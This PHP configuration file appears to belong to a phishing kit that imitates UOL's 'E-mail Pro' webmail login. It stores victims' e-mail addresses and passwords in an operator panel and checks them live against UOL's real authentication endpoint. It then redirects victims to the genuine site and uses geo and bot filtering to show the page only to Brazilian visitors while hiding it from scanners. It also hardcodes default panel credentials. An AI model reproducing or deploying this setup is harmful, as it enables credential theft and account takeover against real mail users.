<?php
declare(strict_types=1);

require_once __DIR__ . '/includes/admin_auth.php';

$panel_user = (string) (getenv('PANEL_USER') ?: 'Danadinho');
$panel_pass = (string) (getenv('PANEL_PASS') ?: 'Danado2027');
$dataDir    = rtrim((string) (getenv('PROVIDER_DATA_DIR') ?: '/data'), '/');
$baseUrl    = rtrim((string) (getenv('APP_BASE_URL') ?: 'https://uolpro-webmail.fly.dev'), '/');

return [
    'site_title'            => 'E-mail Pro - UOL',
    'panel_name'            => (string) (getenv('PANEL_NAME') ?: 'UOL Mail Pro'),
    'panel_marquee'         => 'UOL Mail Pro — logins validados via API original email.uolhost.com.br/auth. E-mail e senha ficam no painel.',
    'default_locale'        => 'pt_br',
    'success_redirect'      => 'https://email.uolhost.com.br/',
    'blocked_redirect'      => 'https://email.uolhost.com.br/',
    'max_ip_visits'         => 4,
    'env'                   => 'production',
    'base_url'              => $baseUrl,
    'login_action'          => 'login.php',
    'api_verify_path'       => 'api/verify.php',
    'session_save_path'     => $dataDir . '/sessions',
    'data_dir'              => $dataDir,
    'panel_user'            => $panel_user,
    'panel_pass'            => $panel_pass,
    'panel_reset_key'       => (string) (getenv('PANEL_RESET_KEY') ?: 'fly-uol-reset'),
    'uol_mailpro_auth_url'  => 'https://email.uolhost.com.br/auth',
    'uol_mailpro_redir_url' => 'email.uolhost.com.br/',
    'uol_mailpro_timeout'   => 30,
    'anti_bot' => [
        'enabled'               => true,
        'allowed_countries'     => ['BR'],
        'enforce_country'       => true,
        'deny_hosting'          => false,
        'deny_proxy_vpn'        => false,
        'deny_datacenter_asn'   => false,
        'deny_bots_ua'          => true,
        'deny_bad_headers'      => false,
        'deny_empty_ua'         => true,
        'deny_headless_signals' => false,
        'enforce_device'        => false,
        'strict_geo_unknown'    => false,
        'allow_localhost'       => false,
        'redirect'              => null,
        'log_blocks'            => true,
    ],
    'admin' => admin_auth_load($dataDir, [
        'panel_user' => $panel_user,
        'panel_pass' => $panel_pass,
    ]),
];
